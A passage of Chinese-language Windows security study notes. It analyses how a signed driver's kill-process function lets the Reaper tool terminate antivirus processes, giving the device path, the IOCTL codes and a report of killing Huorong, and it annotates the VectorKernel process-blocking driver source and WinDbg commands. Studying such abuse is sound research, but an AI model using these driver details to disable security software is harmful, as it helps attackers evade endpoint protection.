ZwTerminateProcess \u641c\u7d22 ZwTerminateProcess \u53ef\u4ee5\u770b\u5230\u88ab\u51fd\u6570 FUN_00017e78 \u8c03\u7528\u4e86\uff0c\u90a3\u4e48 FUN_00017e78 \u662f\u4e0d\u662f\u9020\u6210\u6f0f\u6d1e\u7684\u4e3b\u8981\u539f\u56e0\u5462 \u5728\u770b FUN_00017e78 \u7684\u53cd\u6c47\u7f16\u4e4b\u524d\u5148\u770b\u770b ZwTerminateProcess \u51fd\u6570\u539f\u578b ZwTerminateProcess \u63a5\u53d72\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u8fdb\u7a0b\u7684\u53e5\u67c4\uff0c\u7b2c\u4e8c\u4e2a\u662f\u8fdb\u7a0b\u7684\u9000\u51fa\u72b6\u6001\u3002\u7b80\u5355\u7c97\u66b4 NTSTATUS ZwTerminateProcess( _In_ HANDLE ProcessHandle, _In_ NTSTATUS ExitStatus ); \u5982\u679c\u662f\u7ed3\u675f\u8fdb\u7a0b\u53ef\u4ee5\u88ab\u63a7\u5236\uff0c\u90a3\u60f3\u5fc5\u7b2c\u4e00\u4e2a\u53c2\u6570 ProcessHandle \u80af\u5b9a\u53ef\u4ee5\u88ab\u63a7\u5236\u3002 FUN_00017e78 \u51fd\u6570\u53cd\u6c47\u7f16\u5982\u4e0b ulonglong FUN_00017e78(undefined8 param_1,undefined4 param_2,undefined param_3) { longlong lVar1; uint uVar2; ulonglong uVar3; longlong lVar4; code *pcVar5; longlong local_res20; ulonglong uVar6; undefined8 local_18 [2]; uVar6 = 0; uVar3 = ObReferenceObjectByHandle (param_1,0,*(undefined8 *)PsProcessType_exref,param_3,&local_res20,0); if ((int)uVar3 < 0) { return uVar3; } lVar4 = IoGetCurrentProcess(); lVar1 = local_res20; if (local_res20 == lVar4) { uVar3 = 0xc00000db; } else { if ((DAT_00014334 == 0) && (pcVar5 = (code *)FUN_00011bac(&DAT_000141c0), pcVar5 != (code *)0x0) ) { uVar2 = (*pcVar5)(lVar1,param_2); uVar3 = (ulonglong)uVar2; if (uVar2 != 0xc00000bb) goto LAB_00017f58; } uVar2 = ObOpenObjectByPointer (local_res20,0x200,0,1,*(undefined8 *)PsProcessType_exref, uVar6 & 0xffffffffffffff00,local_18); uVar3 = (ulonglong)uVar2; if (-1 < (int)uVar2) { uVar2 = ZwTerminateProcess(local_18[0],param_2); uVar3 = (ulonglong)uVar2; ZwClose(local_18[0]); } } LAB_00017f58: ObfDereferenceObject(local_res20); return uVar3; } \u4ee3\u7801\u8bfb\u5f97\u5934\u660f\u8111\u80c0\uff1f\u6ca1\u5173\u7cfb\uff0c\u8fd9\u79cd\u4e8b\u60c5\u53ef\u4ee5\u4ea4\u7ed9GPT\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c FUN_00017e78 \u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u5165\u4e86 ObReferenceObjectByHandle \uff0c\u8be5\u51fd\u6570\u662f\u6253\u5f00\u8fdb\u7a0b\u5bf9\u8c61\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u53e5\u67c4\u3002 ObReferenceObjectByHandle \u5c06\u8fd4\u56de\u7684\u53e5\u67c4\u5b58\u5230\u4e86 local_18 \u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002\u800c ZwTerminateProcess \u63a5\u53d7 local_18 \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4f5c\u4e3a\u7ed3\u675f\u7684\u8fdb\u7a0b\u53e5\u67c4\u4f20\u5165\u3002 \u6240\u4ee5\u53ea\u9700\u8981\u63a7\u5236 FUN_00017e78 \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u53ef\u4ee5\u5229\u7528\u9a71\u52a8\u76f4\u63a5\u7ed3\u675f\u8fdb\u7a0b\u3002 \u77e5\u9053\u4e86\u6f0f\u6d1e\u539f\u56e0\uff0c\u518d\u6765\u770b\u770b\u5229\u7528\u5de5\u5177\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u3002","title":"\u5bfb\u627e\u6f0f\u6d1e\u70b9"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_43","text":"https://github.com/MrEmpy/Reaper \u5de5\u5177\u51e0\u4e2a\u51fd\u6570\u5982\u56fe \u4e3b\u8981\u529f\u80fd\u51fd\u6570\u5305\u62ec\u52a0\u8f7d\u9a71\u52a8\u3001\u5378\u8f7d\u9a71\u52a8\u3001\u6682\u505c\u8fdb\u7a0b\u3001\u7ed3\u675f\u8fdb\u7a0b\u3002 \u6765\u8bd5\u4e00\u4e0b\u5de5\u5177\u7684\u6548\u679c\u5427\uff01 \u5982\u4e0b\u56fe\u6740\u4e86\u706b\u7ed22\u4e2a\u8fdb\u7a0b\uff0c\u706b\u7ed2\u5df2\u7ecf\u88ab\u6740\u6ca1\u4e86\u3002 \u8fd9\u4e2a\u5de5\u5177\u6bcf\u6b21\u7ed3\u675f\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u505c\u6b62\u9a71\u52a8\uff0c\u706b\u7ed2\u5b58\u5728\u591a\u4e2a\u8fdb\u7a0b\uff0c\u82e5\u8981\u5b9e\u6218\u9700\u8981\u6539\u4e00\u4e0b\u7a0b\u5e8f\u3002 \u603b\u800c\u8a00\u4e4b\uff0c\u8fd9\u662f\u53ef\u4ee5\u6b63\u786e\u5730\u6740\u6b7b\u706b\u7ed2\u7684\u3002 \u6765\u7528windbg\u8ddf\u4e00\u4e0b\u3002 \u9996\u5148\u57282.8.0.0\u7248\u672c\u7684sys\u627e\u5230\u51fd\u6570\u504f\u79fb\u91cf \u4e0b\u65ad\u70b9 \u6267\u884creaper\u6210\u529f\u5728\u51fd\u6570\u5904\u65ad\u4e0b,rcx\u662f\u8fdb\u7a0b\u53e5\u67c4\uff0crdx\u662f\u9000\u51fa\u72b6\u6001 \u8fd9\u4e2a\u5de5\u5177\u9996\u5148\u4f7f\u7528 DeployDriver \u52a0\u8f7dsys\u9a71\u52a8\u5e76\u8bbe\u7f6e\u5bf9\u8c61\u8def\u5f84 \\\\.\\KProcessHacker2 , \u7136\u540e\u901a\u8fc7\u6307\u5b9a\u7684PID\u4f7f\u7528 OpenProcess \u83b7\u53d6\u8981\u64cd\u4f5c\u7684\u8fdb\u7a0b\u53e5\u67c4\u3002 \u800c\u6700\u6838\u5fc3\u7684\u5728\u4e8e\u8fd9\u4e24\u884c\u76f8\u5e94\u529f\u80fd\u7684 IOCTL \u7f16\u53f7\uff0c\u8fd9\u4e5f\u662f\u6f0f\u6d1e\u5b58\u5728\u7684\u70b9 #define IOCTL_CODE_KILLPROCESS 0x999920df #define IOCTL_CODE_SUSPENDPROC 0x999920d7 \u63a5\u7740\u901a\u8fc7 DeviceIoControl \u51fd\u6570\u64cd\u4f5c\u9a71\u52a8\u5bf9\u8c61\uff0c\u5f80\u76f8\u5e94\u7684 IOCTL \u53d1\u9001\u4e86 ioInput \u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5305\u542b\u8fdb\u7a0b\u53e5\u67c4\u548c\u9000\u51fa\u72b6\u6001\u3002\u4e5f\u6b63\u662f ZwTerminateProcess \u6240\u63a5\u6536\u7684\u53c2\u6570\u3002 \u6700\u540e\u5229\u7528\u9a71\u52a8\u7684\u529f\u80fd\uff0c\u6267\u884c\u4e86\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\u3002","title":"\u5229\u7528\u5de5\u5177\u5206\u6790"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_44","text":"\u5173\u4e8e\u6f0f\u6d1e\u70b9\uff0c\u4e5f\u5c31\u662f IOCTL \u7f16\u53f7\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e2a\uff0c\u8fd8\u9700\u8981\u8fdb\u4e00\u6b65\u7814\u7a76\u3002","title":"\u5c3e\u58f0"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#vectorkernel","text":"\u4e92\u8054\u7f51\u51b2\u6d6a\u65f6\u53d1\u73b0\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u4f5c\u8005\u5199\u4e86\u542b\u591a\u4e2a\u81ea\u5b9a\u4e49\u529f\u80fd\u7684sys\u9a71\u52a8\uff0c\u5e76\u7528C#\u7a0b\u5e8f\u8c03\u7528\u9a71\u52a8\u3002 \u6765\u770b\u770b\u8fd9\u4e2a\u5de5\u5177\u3002 \u9879\u76ee\u5730\u5740 https://github.com/daem0nc0re/VectorKernel","title":"VectorKernel\u5de5\u5177\u5b66\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#blocknewproc","text":"\u963b\u6b62\u521b\u5efa\u65b0\u8fdb\u7a0b \u5148\u521b\u5efa\u4e00\u4e2a\u9a71\u52a8\u670d\u52a1 sc create BlockNewProc binPath= C:\\Users\\admin\\Desktop\\VectorKernel\\BlockNewProcClient type= kernel \u7981\u7528\u4e86 notepad.exe \uff0cnotepad\u5df2\u7ecf\u4e0d\u80fd\u542f\u52a8\u4e86 \u53d6\u6d88\u7981\u7528\uff0c\u53c8\u53ef\u4ee5\u542f\u52a8\u4e86 \u770b\u770bsys\u4ee3\u7801\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u3002 \u9a71\u52a8\u4e3b\u51fd\u6570 DriverEntry \u3002 NTSTATUS DriverEntry( _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) { //\u5404\u79cd\u521d\u59cb\u5316\uff0c\u4ec5\u652f\u630164\u4f4d\u7cfb\u7edf UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY; PDEVICE_OBJECT pDeviceObject = nullptr; #ifndef _WIN64 KdPrint((DRIVER_PREFIX \"32bit OS is not supported.\\n\")); return STATUS_NOT_SUPPORTED; #endif do { UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH); UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH); //\u4e92\u65a5\u9501 ::ExInitializeFastMutex(&g_FastMutex); //\u521b\u5efa\u9a71\u52a8 ntstatus = ::IoCreateDevice( DriverObject, NULL, &devicePath, FILE_DEVICE_UNKNOWN, NULL, FALSE, &pDeviceObject); if (!NT_SUCCESS(ntstatus)) { pDeviceObject = nullptr; KdPrint((DRIVER_PREFIX \"Failed to create device (NTSTATUS = 0x%08X).\\n\", ntstatus)); break; } //\u521b\u5efa\u7b26\u53f7\u94fe\u63a5 ntstatus = ::IoCreateSymbolicLink(&symlinkPath, &devicePath); if (!NT_SUCCESS(ntstatus)) { KdPrint((DRIVER_PREFIX \"Failed to create symbolic link (NTSTATUS = 0x%08X).\\n\", ntstatus)); break; } //\u9a71\u52a8\u6ce8\u518c //\u8bbe\u7f6emajor\u529f\u80fd\u5904\u7406\u7a0b\u5e8f\u3002 //major \u529f\u80fd\u5904\u7406\u7a0b\u5e8f\u662f\u9a71\u52a8\u7a0b\u5e8f\u5904\u7406 IRP \u8bf7\u6c42\u7684\u51fd\u6570\u3002IRP\u8bf7\u6c42\u9700\u8981\u7528\u5230\u8fd9\u4e2a\u51fd\u6570\u3002 // I/O \u8bf7\u6c42\u6709\u4e0d\u540c\u7684\u7c7b\u578b\uff0c\u6bcf\u4e2a\u7c7b\u578b\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684 major \u529f\u80fd //\u5c06\u9a71\u52a8\u5378\u8f7d\u7a0b\u5e8f\u8bbe\u7f6e\u4e3aDriverUnload\u51fd\u6570 DriverObject->DriverUnload = DriverUnload; //\u8bbe\u7f6e\u521b\u5efa\u8bbe\u5907\u7684IRP\u8bf7\u6c42\u51fd\u6570\u4e3aOnCreateClose DriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose; //\u8bbe\u7f6e\u5173\u95ed\u8bbe\u5907\u7684IRP\u8bf7\u6c42\u51fd\u6570\u4e3aOnCreateClose DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose; //\u8bbe\u7f6e\u5904\u7406\u8bbe\u5907\u63a7\u5236\u7684IRP\u8bf7\u6c42\u51fd\u6570\u4e3aOnDeviceControl DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl; KdPrint((DRIVER_PREFIX \"Driver is loaded successfully.\\n\")); } while (false); if (!NT_SUCCESS(ntstatus) && (pDeviceObject != nullptr)) ::IoDeleteDevice(pDeviceObject); return ntstatus; } \u9a71\u52a8\u5378\u8f7d\u7a0b\u5e8f\u51fd\u6570 DriverUnload void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) { UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH); ::IoDeleteSymbolicLink(&symlinkPath); //\u5220\u9664\u7b26\u53f7\u94fe\u63a5 ::IoDeleteDevice(DriverObject->DeviceObject); //\u5220\u9664\u8bbe\u5907\u5bf9\u8c61 //\u5982\u679c\u5b58\u5728Callback\u51fd\u6570\uff0c\u5219\u6ce8\u9500 if (g_CallbackRegistered) { ::PsSetCreateProcessNotifyRoutineEx2( PsCreateProcessNotifySubsystems, (PVOID)ProcessBlockRoutine, TRUE); } KdPrint((DRIVER_PREFIX \"Driver is unloaded.\\n\")); } \u521b\u5efa\u548c\u5173\u95ed\u8bbe\u5907\u51fd\u6570 OnCreateClose \u3002 \u4f5c\u7528\u662f\u8bbe\u7f6e\u72b6\u6001 NTSTATUS OnCreateClose( _Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); NTSTATUS ntstatus = STATUS_SUCCESS; Irp->IoStatus.Status = ntstatus; Irp->IoStatus.Information = 0u; IoCompleteRequest(Irp, 0); return ntstatus; } \u63a7\u5236\u51fd\u6570 NTSTATUS OnDeviceControl( _Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST; PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp); auto& dic = irpSp->Parameters.DeviceIoControl; ULONG_PTR info = NULL; switch (dic.IoControlCode) { //IOCTL_SET_PROCESS_FILENAME\u662f\u8fdb\u5236\u521b\u5efa\u76f8\u5e94\u8fdb\u7a0b\u7684\u4ee3\u7801 case IOCTL_SET_PROCESS_FILENAME: if (dic.InputBufferLength < sizeof(BLOCK_FILENAME_INFO)) { ntstatus = STATUS_BUFFER_TOO_SMALL; break; } //\u83b7\u53d6\u4e92\u65a5\u9501 ::ExAcquireFastMutex(&g_FastMutex); //\u8fd9\u91cc\u83b7\u53d6\u4f20\u5165\u7684\u6587\u4ef6\u540d\u4fdd\u5b58\u5230g_ImageFileNameSuffix[] ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258); g_ImageFileNameSuffix[0] = L'\\\\'; ::memcpy(&g_ImageFileNameSuffix[1], Irp->AssociatedIrp.SystemBuffer, sizeof(BLOCK_FILENAME_INFO)); g_ImageFileNameSuffix[257] = L'\\0'; KdPrint((DRIVER_PREFIX \"Target ImageFileName pattern is updated to \\\"%ws\\\".\\n\", &g_ImageFileNameSuffix)); //\u6ce8\u518ccallback\u51fd\u6570PsSetCreateProcessNotifyRoutineEx2\uff0c\u6267\u884cProcessBlockRoutine\u9501\u8fdb\u7a0b\u521b\u5efa\u7684\u51fd\u6570 if (!g_CallbackRegistered) { ntstatus = ::PsSetCreateProcessNotifyRoutineEx2( PsCreateProcessNotifySubsystems, (PVOID)ProcessBlockRoutine, FALSE); if (!NT_SUCCESS(ntstatus)) { KdPrint((DRIVER_PREFIX \"Failed to register Process Notify Routine (NTSTATUS = 0x%08X).\", ntstatus)); break; } else { g_CallbackRegistered = TRUE; KdPrint((DRIVER_PREFIX \"Process Notify Callback is registered successfully.\\n\")); } } //\u91ca\u653e\u4e92\u65a5\u9501 ::ExReleaseFastMutex(&g_FastMutex); info = ::wcslen(g_ImageFileNameSuffix) * sizeof(WCHAR); ntstatus = STATUS_SUCCESS; break; //IOCTL_UNREGISTER_CALLBACK\u5206\u652f\u662f\u91ca\u653e\u56de\u8c03\u51fd\u6570 case IOCTL_UNREGISTER_CALLBACK: ::ExAcquireFastMutex(&g_FastMutex); if (g_CallbackRegistered) { ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258); ntstatus = ::PsSetCreateProcessNotifyRoutineEx2( PsCreateProcessNotifySubsystems, (PVOID)ProcessBlockRoutine, TRUE); if (!NT_SUCCESS(ntstatus)) { KdPrint((DRIVER_PREFIX \"Failed to unregister Process Notify Callback (NTSTATUS = 0x%08X).\\n\", ntstatus)); } else { g_CallbackRegistered = FALSE; KdPrint((DRIVER_PREFIX \"Process Notify Callback is unregistered successfully.\\n\")); } } else { KdPrint((DRIVER_PREFIX \"Process Notify Callback is not registered.\\n\")); } ::ExReleaseFastMutex(&g_FastMutex); } //\u5b8c\u6210IRP\u8bf7\u6c42 Irp->IoStatus.Status = ntstatus; Irp->IoStatus.Information = info; IoCompleteRequest(Irp, 0); return ntstatus; } \u8fd9\u6837\u770b\u6765\u662f\u901a\u8fc7\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u63a7\u5236\u7684\u56de\u8c03\u51fd\u6570\u6765\u5b9e\u73b0\u7981\u6b62\u8fdb\u7a0b\u521b\u5efa\u7684\u3002 ProcessBlockRoutine \u51fd\u6570 \u5b9e\u73b0\u529f\u80fd\u903b\u8f91\u5c31\u662f CreateInfo->CreationStatus = STATUS_ACCESS_DENIED \u5c06 CreateInfo \u7684 CreationStatus \u8bbe\u7f6e\u4e3a STATUS_ACCESS_DENIED void ProcessBlockRoutine( _Inout_ PEPROCESS Process, _In_ HANDLE ProcessId, _Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); UNREFERENCED_PARAMETER(ProcessId); if (CreateInfo != nullptr) { ::ExAcquireFastMutex(&g_FastMutex); if (::wcslen(g_ImageFileNameSuffix) > 0) { UNICODE_STRING suffix{ 0 }; ::RtlInitUnicodeString(&suffix, g_ImageFileNameSuffix); if (::RtlSuffixUnicodeString(&suffix, (PUNICODE_STRING)CreateInfo->ImageFileName, TRUE)) { CreateInfo->CreationStatus = STATUS_ACCESS_DENIED; KdPrint((DRIVER_PREFIX \"Blocked Process: %wZ\\n\", (PUNICODE_STRING)CreateInfo->ImageFileName)); } else { KdPrint((DRIVER_PREFIX \"Allowed Process: %wZ\\n\", (PUNICODE_STRING)CreateInfo->ImageFileName)); } } else { KdPrint((DRIVER_PREFIX \"Allowed Process: %wZ\\n\", (PUNICODE_STRING)CreateInfo->ImageFileName)); } ::ExReleaseFastMutex(&g_FastMutex); } } CreateInfo \u7ed3\u6784\u4f53 typedef struct _PPS_CREATE_NOTIFY_INFO { UNICODE_STRING ImageFileName; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u6620\u50cf\u6587\u4ef6\u540d\u3002\u8be5\u6210\u5458\u662f\u4e00\u4e2a `UNICODE_STRING` \u7ed3\u6784\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7684\u5b57\u7b26\u4e32\u548c\u957f\u5ea6 UNICODE_STRING ProcessName; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u4e3b\u6a21\u5757\u540d\u3002\u8be5\u6210\u5458\u4e5f\u662f\u4e00\u4e2a `UNICODE_STRING` \u7ed3\u6784 HANDLE ProcessId; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u53e5\u67c4\u3002\u8be5\u6210\u5458\u662f\u4e00\u4e2a `HANDLE` \u7c7b\u578b NTSTATUS CreationStatus; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u521b\u5efa\u72b6\u6001\u3002\u8be5\u6210\u5458\u662f\u4e00\u4e2a `NTSTATUS` \u7c7b\u578b\u3002 } PPS_CREATE_NOTIFY_INFO; CreationStatus \u662f\u4e00\u4e2a NTSTATUS \u503c\uff0c\u5c06\u503c\u5b9a\u4e49\u6210\u9519\u8bef\u7c7b\u578b\u7684\u503c\u5c31\u53ef\u4ee5\u963b\u6b62\u8fdb\u7a0b\u521b\u5efa\u3002 \u5fae\u8f6f\u5b9a\u4e49\u7684\u6240\u6709 NTSTATUS \u503c\u53ef\u5728 ntstatus.h \u627e\u5230\u3002 \u7531\u4e8e\u5b9a\u4e49\u7684\u662f STATUS_ACCESS_DENIED \uff0c\u6240\u4ee5\u7cfb\u7edf\u51fa\u73b0\u7684\u62d2\u7edd\u8bbf\u95ee\u5f39\u7a97\uff0c\u6539\u6210\u5176\u4ed6\u72b6\u6001\u53c8\u4f1a\u662f\u53e6\u4e00\u79cd\u5f39\u7a97\u6216\u662f\u65e0\u5f39\u7a97\u3002 \u4f46\u8fd9\u4e9b\u90fd\u4e0d\u91cd\u8981\uff0c\u91cd\u8981\u7684\u662f\u9519\u8bef\u72b6\u6001\u963b\u6b62\u4e86\u8fdb\u7a0b\u7684\u521b\u5efa\u3002 \u7528windbg\u8c03\u8bd5\u4e00\u4e0b\u9a71\u52a8\uff0c\u5728 BlockNewProcDrv_x64 \u9a71\u52a8\u4e2d\u53ef\u627e\u5230 _PPS_CREATE_NOTIFY_INFO \u7ed3\u6784\u4f53 \u5728 ProcessBlockRoutine \u51fd\u6570\u8c03\u7528\u524d\u4e0b\u65ad\u70b9\uff0c\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u4f20\u5165\u7684\u53d8\u91cf","title":"BlockNewProc"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#windbg","text":"https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/commands https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/standard-debugging-techniques","title":"Windbg"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_45","text":".process \u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f .process 0 0 cmd.exe \u67e5\u627e\u8fdb\u7a0b lm \u67e5\u770b\u6a21\u5757 0:009> lm start end module name 00007ff6`f33c0000 00007ff6`f34da000 Notepad C (no symbols) 00007ffb`9a5c0000 00007ffb`9a77c000 DUI70 (deferred) 00007ffb`b9350000 00007ffb`b9933000 Microsoft_UI_Xaml (deferred) 00007ffb`c0b40000 00007ffb`c0e78000 riched20 (deferred) 00007ffb`c3550000 00007ffb`c3578000 edputil (deferred) ~ \u67e5\u770b\u7ebf\u7a0b 0:009> ~ 0 Id: f90.400c cSuspend: 1 Teb: 00000041`0f6b4000 Unfrozen 1 Id: f90.15ec Suspend: 1 Teb: 00000041`0f6b6000 Unfrozen 2 Id: f90.4a18 Suspend: 1 Teb: 00000041`0f6b8000 Unfrozen 3 Id: f90.3ea4 Suspend: 1 Teb: 00000041`0f6ba000 Unfrozen 4 Id: f90.3840 Suspend: 1 Teb: 00000041`0f6bc000 Unfrozen 5 Id: f90.1a50 Suspend: 1 Teb: 00000041`0f6be000 Unfrozen 6 Id: f90.4514 Suspend: 1 Teb: 00000041`0f6c0000 Unfrozen 7 Id: f90.3d30 Suspend: 1 Teb: 00000041`0f6c2000 Unfrozen k \u67e5\u770b\u6808 0:009> k # Child-SP RetAddr Call Site 00 00000041`100fc558 00007ffc`02a55370 ntdll!NtCreateFile 01 00000041`100fc560 00007ffc`02a54cdc KERNELBASE!CreateFileInternal+0x590 02 00000041`100fc6d0 00007ffc`02a5488c KERNELBASE!CreateFileW+0x7c 03 00000041`100fc750 00007ffc`02a563c0 KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x4dc 04 00000041`100fc980 00007ffc`04707ddc KERNELBASE!LoadLibraryExW+0xe0 05 00000041`100fc9f0 00007ffc`04707bea SHELL32!GetShellStyleHInstance+0xcc 06 00000041`100fcd20 00007ffc`04707ba0 SHELL32!UpdateStyle+0x1e 07 00000041`100fcd60 00007ffc`04707a93 SHELL32!DUI_ShellStyleSheet_InitProcess+0x94 08 00000041`100fcda0 00007ffc`0474c2d7 SHELL32!InitializeDirectUI+0x4b u \u67e5\u770b\u5f53\u524d\u6c47\u7f16\u4ee3\u7801 0:009> u ntdll!NtCreateFile+0x18: 00007ffc`0528fe18 0f1f840000000000 nop dword ptr [rax+rax] ntdll!NtQueryEvent: 00007ffc`0528fe20 4c8bd1 mov r10,rcx 00007ffc`0528fe23 b856000000 mov eax,56h 00007ffc`0528fe28 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffc`0528fe30 7503 jne ntdll!NtQueryEvent+0x15 (00007ffc`0528fe35) 00007ffc`0528fe32 0f05 syscall 00007ffc`0528fe34 c3 ret 00007ffc`0528fe35 cd2e int 2Eh r \u67e5\u770b\u5bc4\u5b58\u5668 0:009> r rax=0000000000000005 rbx=0000000000000000 rcx=00000041100fc5e0 rdx=0000000080100080 rsi=0000000000000000 rdi=0000000000000000 rip=00007ffc0528fe00 rsp=00000041100fc558 rbp=00000041100fc660 r8=00000041100fc640 r9=00000041100fc5e8 r10=ce709ee7125b9070 r11=00000041100fc540 r12=0000000000000001 r13=0000000000000000 r14=0000000080100080 r15=0000000000000000 iopl=0 nv up ei ng nz na pe nc cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000282 ntdll!NtCreateFile: 00007ffc`0528fe00 4c8bd1 mov r10,rcx 0:009> r al al=5 0:009> r eax eax=5 0:009> r rax rax=0000000000000005 d \u67e5\u770b\u5185\u5b58 0:009> d 00007ffc`0528fe00 4c 8b d1 b8 55 00 00 00-f6 04 25 08 03 fe 7f 01 L...U.....%..... 00007ffc`0528fe10 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... 00007ffc`0528fe20 4c 8b d1 b8 56 00 00 00-f6 04 25 08 03 fe 7f 01 L...V.....%..... 00007ffc`0528fe30 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... 00007ffc`0528fe40 4c 8b d1 b8 57 00 00 00-f6 04 25 08 03 fe 7f 01 L...W.....%..... 00007ffc`0528fe50 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... 00007ffc`0528fe60 4c 8b d1 b8 58 00 00 00-f6 04 25 08 03 fe 7f 01 L...X.....%..... 00007ffc`0528fe70 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... x \u5339\u914d\u7b26\u53f7\uff0c\u53ef\u7528\u6765\u67e5\u627e\u51fd\u6570\u5730\u5740 0:009> x ntdll!createf* Breakpoint 0 hit ntdll!NtCreateFile: 00007ffc`0528fe00 4c8bd1 mov r10,rcx bp\u3001bu\u3001bm \u8bbe\u7f6e\u65ad\u70b9 \u6839\u636e\u5730\u5740\u65ad\u70b9 1.\u6839\u636e\u9759\u6001\u627e\u5230\u504f\u79fb\u91cf 2.\u67e5\u770b\u5f53\u524d\u6a21\u5757\u865a\u62df\u5730\u5740+\u504f\u79fb\u91cf\u65ad\u70b9 0:002> lm start end module name 00007ff6`07c20000 00007ff6`07c36000 a T (no symbols) 00007ffb`ff880000 00007ffb`ff917000 apphelp (deferred) 00007ffc`02a30000 00007ffc`02dd5000 KERNELBASE (deferred) 00007ffc`02fc0000 00007ffc`03084000 KERNEL32 (pdb symbols) E:\\Windows Kits\\10\\Debuggers\\x64\\sym\\kernel32.pdb\\6F7660385E7D8D33ED9B5A39B03822F01\\kernel32.pdb 00007ffc`04f60000 00007ffc`05007000 msvcrt (deferred) 00007ffc`051f0000 00007ffc`05407000 ntdll (pdb symbols) E:\\Windows Kits\\10\\Debuggers\\x64\\sym\\ntdll.pdb\\58A282C24AEE7E03A8CF8CB0A782CE0C1\\ntdll.pdb 0:002> u 00007ff6`07c214c7 a+0x14c7: 00007ff6`07c214c7 e8c7ffffff call a+0x1493 (00007ff6`07c21493) 00007ff6`07c214cc 4889ca mov rdx,rcx 00007ff6`07c214cf 8a02 mov al,byte ptr [rdx] 00007ff6`07c214d1 4883c202 add rdx,2 00007ff6`07c214d5 84c0 test al,al 00007ff6`07c214d7 7407 je a+0x14e0 (00007ff6`07c214e0) 00007ff6`07c214d9 83e00f and eax,0Fh 00007ff6`07c214dc 01c6 add esi,eax 0:002> bp 00007ff6`07c214c7 \u6279\u91cf\u65ad\u70b9 0:000> bm ntdll!ZwTer* 2: 00007ffc`05292d30 @!\"ntdll!ZwTerminateJobObject\" 3: 00007ffc`05292d10 @!\"ntdll!ZwTerminateEnclave\" 4: 00007ffc`0528fdc0 @!\"ntdll!ZwTerminateThread\" 5: 00007ffc`0528f8e0 @!\"ntdll!ZwTerminateProcess\" 0:000> bl 1 e Disable Clear 00007ff6`07c214cc 0001 (0001) 0:**** a+0x14cc 2 e Disable Clear 00007ffc`05292d30 0001 (0001) 0:**** ntdll!NtTerminateJobObject 3 e Disable Clear 00007ffc`05292d10 0001 (0001) 0:**** ntdll!NtTerminateEnclave 4 e Disable Clear 00007ffc`0528fdc0 0001 (0001) 0:**** ntdll!NtTerminateThread 5 e Disable Clear 00007ffc`0528f8e0 0001 (0001) 0:**** ntdll!NtTerminateProcess 